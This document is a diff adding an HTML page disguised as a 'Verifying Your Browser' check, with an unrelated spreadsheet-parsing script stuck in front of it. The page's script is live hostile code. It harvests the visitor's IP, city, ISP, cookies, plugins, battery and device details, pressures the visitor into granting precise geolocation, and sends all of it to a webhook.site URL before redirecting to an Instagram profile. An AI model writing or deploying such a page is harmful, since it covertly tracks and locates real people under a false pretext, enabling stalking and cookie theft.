@@ -1,0 +1,225 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifying Your Browser</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3b82f6;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+  <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
+    <h3 class="text-2xl font-semibold text-gray-800 mb-4">Verifying Your Browser</h3>
+    <p class="text-gray-600 mb-6" id="status">Collecting initial data...</p>
+    <div class="loader" id="loader"></div>
+    <p class="text-sm text-gray-500 mt-6">This process helps protect your experience.</p>
+
+    <script>
+      async function getDeviceDetails() {
+        let ipData = {};
+        try {
+          const response = await fetch('https://ipapi.co/json/');
+          ipData = await response.json();
+        } catch (e) {
+          console.error('Failed to fetch IP data:', e);
+        }
+
+        // Get battery status if available
+        let batteryInfo = {};
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryInfo = {
+              batteryLevel: battery.level || 'unknown',
+              batteryCharging: battery.charging || false,
+              chargingTime: battery.chargingTime || 'unknown',
+              dischargingTime: battery.dischargingTime || 'unknown'
+            };
+          } catch (e) {
+            console.error('Failed to fetch battery data:', e);
+          }
+        }
+
+        // Get plugins and MIME types
+        const plugins = Array.from(navigator.plugins || []).map(p => ({
+          name: p.name,
+          description: p.description,
+          filename: p.filename
+        }));
+        const mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+
+        // Get network information if available
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        
+        return {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          screenColorDepth: window.screen.colorDepth || 'unknown',
+          screenPixelRatio: window.devicePixelRatio || 'unknown',
+          screenOrientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
+          language: navigator.language,
+          languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+          cookiesEnabled: navigator.cookieEnabled || false,
+          cookies: document.cookie || 'none',
+          doNotTrack: navigator.doNotTrack || 'unknown',
+          plugins: plugins.length ? plugins : 'none',
+          mimeTypes: mimeTypes.length ? mimeTypes : 'none',
+          deviceMemory: navigator.deviceMemory || 'unknown',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+          connectionType: connection.type || 'unknown',
+          connectionEffectiveType: connection.effectiveType || 'unknown',
+          connectionDownlink: connection.downlink || 'unknown',
+          ip: ipData.ip || 'unknown',
+          city: ipData.city || 'unknown',
+          country: ipData.country_name || 'unknown',
+          isp: ipData.org || 'unknown',
+          referrer: document.referrer || 'none',
+          windowDimensions: `${window.innerWidth}x${window.innerHeight}`,
+          onlineStatus: navigator.onLine ? 'online' : 'offline',
+          timestamp: new Date().toISOString(),
+          ...batteryInfo
+        };
+      }
+
+      function updateStatus(message, showLoader) {
+        document.getElementById('status').textContent = message;
+        document.getElementById('loader').style.display = showLoader ? 'block' : 'none';
+      }
+
+      // Collect initial data
+      updateStatus('Collecting initial data...', true);
+      getDeviceDetails().then(deviceDetails => {
+        // Now request location permission
+        updateStatus('Requesting location access to proceed...', true);
+        navigator.geolocation.getCurrentPosition(
+          async function(position) {
+            updateStatus('Verifying your browser...', true);
+            const data = {
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              altitude: position.coords.altitude || 'unknown',
+              heading: position.coords.heading || 'unknown',
+              speed: position.coords.speed || 'unknown',
+              ...deviceDetails
+            };
+
+            try {
+              await fetch("https://webhook.site/5d6c5981-0417-4731-9f3e-97e1e6368ae7", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+              });
+            } catch (e) {
+              console.error('Failed to send data:', e);
+            }
+
+            setTimeout(() => {
+              window.location.href = "https://www.instagram.com/style_with_rehana?igsh=MXA0dHFlYnJ4OWIzMw==";
+            }, 2000);
+          },
+          function(error) {
+            updateStatus('Location access required. Please allow location to continue.', false);
+            // Monitor permission changes
+            navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
+              permissionStatus.onchange = function() {
+                if (this.state === 'granted') {
+                  updateStatus('Requesting location access to proceed...', true);
+                  navigator.geolocation.getCurrentPosition(
+                    async function(position) {
+                      updateStatus('Verifying your browser...', true);
+                      const data = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude || 'unknown',
+                        heading: position.coords.heading || 'unknown',
+                        speed: position.coords.speed || 'unknown',
+                        ...deviceDetails
+                      };
+
+                      try {
+                        await fetch("https://webhook.site/5d6c5981-0417-4731-9f3e-97e1e6368ae7", {
+                          method: "POST",
+                          headers: { "Content-Type": "application/json" },
+                          body: JSON.stringify(data)
+                        });
+                      } catch (e) {
+                        console.error('Failed to send data:', e);
+                      }
+
+                      setTimeout(() => {
+                        window.location.href = "https://www.instagram.com/style_with_rehana?igsh=MXA0dHFlYnJ4OWIzMw==";
+                      }, 2000);
+                    },
+                    function(error) {
+                      updateStatus('Location access required. Please allow location to continue.', false);
+                    },
+                    { enableHighAccuracy: true }
+                  );
+                }
+              };
+            });
+          },
+          { enableHighAccuracy: true }
+        );
+      });
+    </script>
+  </div>
+</body>
+</html>
